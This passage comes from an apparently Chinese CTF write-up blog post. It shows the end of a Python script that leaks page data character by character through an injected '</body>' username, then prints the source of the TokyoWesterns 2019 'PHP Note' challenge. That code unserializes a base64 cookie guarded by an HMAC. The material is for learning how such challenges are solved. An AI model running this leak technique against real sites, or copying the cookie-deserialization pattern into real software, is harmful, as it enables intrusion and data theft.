+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/login&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/body&amp;gt;&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">randstr&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s1">&amp;#39;password&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">randstr&lt;/span>&lt;span class="p">()})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">leak&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sess&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里&lt;code>trigger&lt;/code>函数中 idx 就是获取的&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的第几位，c 就是我们传入的用于比较的 ascii 码值。至此，这题就分析完毕了。&lt;/p>
+&lt;h2 id="php-note">PHP Note
+&lt;/h2>&lt;p>在 TokyoWesterns CTF 2019 上，由于 WCTF 2019 上的失误，让他们又出了一道与之相关的题目。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;span class="lnt">155
+&lt;/span>&lt;span class="lnt">156
+&lt;/span>&lt;span class="lnt">157
+&lt;/span>&lt;span class="lnt">158
+&lt;/span>&lt;span class="lnt">159
+&lt;/span>&lt;span class="lnt">160
+&lt;/span>&lt;span class="lnt">161
+&lt;/span>&lt;span class="lnt">162
+&lt;/span>&lt;span class="lnt">163
+&lt;/span>&lt;span class="lnt">164
+&lt;/span>&lt;span class="lnt">165
+&lt;/span>&lt;span class="lnt">166
+&lt;/span>&lt;span class="lnt">167
+&lt;/span>&lt;span class="lnt">168
+&lt;/span>&lt;span class="lnt">169
+&lt;/span>&lt;span class="lnt">170
+&lt;/span>&lt;span class="lnt">171
+&lt;/span>&lt;span class="lnt">172
+&lt;/span>&lt;span class="lnt">173
+&lt;/span>&lt;span class="lnt">174
+&lt;/span>&lt;span class="lnt">175
+&lt;/span>&lt;span class="lnt">176
+&lt;/span>&lt;span class="lnt">177
+&lt;/span>&lt;span class="lnt">178
+&lt;/span>&lt;span class="lnt">179
+&lt;/span>&lt;span class="lnt">180
+&lt;/span>&lt;span class="lnt">181
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">include&lt;/span> &lt;span class="s1">&amp;#39;config.php&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Note&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="fm">__construct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$admin&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">notes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">isadmin&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$admin&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">addnote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$title&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$body&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">array_push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">notes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nv">$title&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$body&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">getnotes&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">notes&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">getflag&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">isadmin&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nx">FLAG&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">verify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$hmac&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$secret&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">hash_equals&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">hash_hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sha256&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$secret&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nv">$hmac&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$secret&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">hash_hmac&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sha256&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$secret&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$seed&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">SALT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$seed&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">PEPPER&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">is_login&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Location: /?action=&lt;/span>&lt;span class="si">$action&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$method&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$action&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;action&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;logout&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;post&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;source&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;getflag&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;source&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">highlight_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">__FILE__&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">session_start&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">is_login&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$realname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$nickname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$note&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">verify&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;note&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;hmac&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">?&lt;/span> &lt;span class="nx">unserialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_COOKIE&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;note&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">:&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Note&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$method&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$nickname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$realname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$realname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$realname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;invalid name&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
